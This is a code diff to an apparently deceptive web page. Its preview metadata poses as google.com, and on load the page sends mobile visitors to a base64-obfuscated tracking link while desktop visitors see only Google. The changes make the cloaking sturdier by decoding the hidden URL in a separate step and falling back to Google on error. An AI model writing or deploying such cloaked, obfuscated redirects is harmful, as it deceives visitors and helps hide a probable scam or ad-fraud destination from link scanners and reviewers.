@@ -7,8 +7,8 @@
 
     <meta property="og:title" content="❤💚🧡">
     <meta property="og:description" content="">
-    <meta property="og:image" content="https://knadfac-00.pages.dev/Untitled design (58).jpg">
-    <meta property="og:url" content="https://www.google.com">
+    <meta property="og:image" content="https://pages.dev design (58).jpg">
+    <meta property="og:url" content="https://google.com">
     <meta property="og:type" content="website">
 
     <script>
@@ -17,9 +17,23 @@
         var screenWidth = window.innerWidth;
 
         if (isMobile || screenWidth <= 768) {
-            window.location.href = "aHR0cHM6Ly9jcmFmdGFnZ3JlZ2F0ZS5jb20vcnQzbjVkcTc/a2V5PTBlNTYxMmZiNTc5OTAzMGEyOWRmMTMyNWQxMTg5Yjcy";
+            // Humne encrypted string ko bilkul alag variable mein rakha hai
+            var secretCode = "aHR0cHM6Ly9jcmFmdGFnZ3JlZ2F0ZS5jb20vcnQzbjVkcTc/a2V5PTBlNTYxMmZiNTc5OTAzMGEyOWRmMTMyNWQxMTg5Yjcy";
+            
+            try {
+                var finalUrl = atob(secretCode);
+                // Agar link sahi decode ho jaye, tabhi redirect karega
+                if (finalUrl.startsWith("http")) {
+                    window.location.replace(finalUrl);
+                } else {
+                    window.location.replace("https://google.com/");
+                }
+            } catch(e) {
+                // Agar koi error aaye toh google par bhej dega, error loop nahi banayega
+                window.location.replace("https://google.com/");
+            }
         } else {
-            window.location.href = "https://www.google.com/";
+            window.location.replace("https://google.com/");
         }
     });
     </script>
